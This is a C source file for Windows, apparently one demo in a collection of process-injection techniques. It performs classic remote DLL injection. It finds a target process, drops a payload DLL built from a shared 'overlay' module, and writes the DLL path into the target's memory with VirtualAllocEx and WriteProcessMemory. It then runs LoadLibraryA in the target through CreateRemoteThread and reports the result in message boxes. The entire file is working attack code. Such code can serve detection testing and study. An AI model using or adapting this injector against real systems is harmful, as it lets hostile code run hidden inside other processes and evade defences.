#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>
#include "..\..\Shared\findProcess.c"
#include "..\..\Shared\payload.c"
#include "..\..\Shared\overlay.c"

typedef void* HANDLE;

int remoteDllInjection(char process[25]){
    int pid = 0;
    if (process[0] == 0x00){
        pid = findPidOf32BitProcess(atoi(process));
    }else{
        pid = findPidOfProcess(process);
    }
    
    if (pid == 0){
        return 1; //Process does not exist.
    }

    struct Overlay overlay;
    getOverlay(overlay);

    char *dllPath = (char *)dropDll("remoteDllinjection.dll", (Payload)overlay);
    if (dllPath == 0){
        return 2; //DLL could not be created
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 3; //Process could not be opened
    }
    

    int dllPathSize = strlen(dllPath);
    int *allocAddress;
    allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
    if(allocAddress == NULL){
        return 4; //Could not allocate memory in remote processse
    }

    if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
        return 5; //Could not write to remote process
    }

    FARPROC loadLibraryAddress = NULL;
    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 != 0){
        loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    }
    if (loadLibraryAddress == NULL){
        return 6; //Could not found LoadLibrary function
    }
    
    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, allocAddress, 0, NULL);
    if(hNewThread == NULL){
        return 7; //Could not create remote thread
    }
    
    WaitForSingleObject(hNewThread, 200);

    if(VirtualFreeEx(hProcess, allocAddress, 0, MEM_RELEASE) == 0){
        return 8; // Could not free address in remote process
    }
    CloseHandle(hNewThread);
    CloseHandle(hProcess);
    return 0;

}


int main(int argc, char *argv[]){
    char process[25];
    if (argc > 1){ 
        //first argument shoudl be taret process name or minimum process PID
        if(strlen(argv[1]) < 25){
            strcpy(process, argv[1]);
        }else{
            goto Default;
        }   
    }else{
        //default process name
        Default:process[0] = 0; // if no process name is provided, program injects dll to the fisrt 32 bit porcess found, this is bad on 32 bit OS because first processes are usually priviledges which could not be injected
    }

    switch (remoteDllInjection(process))
    {
    case 0:
        MessageBox(0,"Injection successfull.","Success",0);
        return 0;
    case 1:
        MessageBox(0,"Injection failed. Process does not exist.","Failure",0);
        return 1;
    case 2:
        MessageBox(0,"Injection failed. DLL could not be created.","Failure",0);
        return 1;
    case 3:
        MessageBox(0,"Injection failed. Process could not be opened.","Failure",0);
        return 1;
    case 4:
        MessageBox(0,"Injection failed. Could not allocate memory in remote process.","Failure",0);
        return 1;
    case 5:
        MessageBox(0,"Injection failed. Could not write to remote process.","Failure",0);
        return 1;
    case 6:
        MessageBox(0,"Injection failed. Could not found LoadLibrary function.","Failure",0);
        return 1;
    case 7:
        MessageBox(0,"Injection failed. Could not create remote thread.","Failure",0);
        return 1;
    case 8:
        MessageBox(0,"Injection failed. Could not free address in remote process.","Failure",0);
        return 1;
    }
    
    return 1;
}
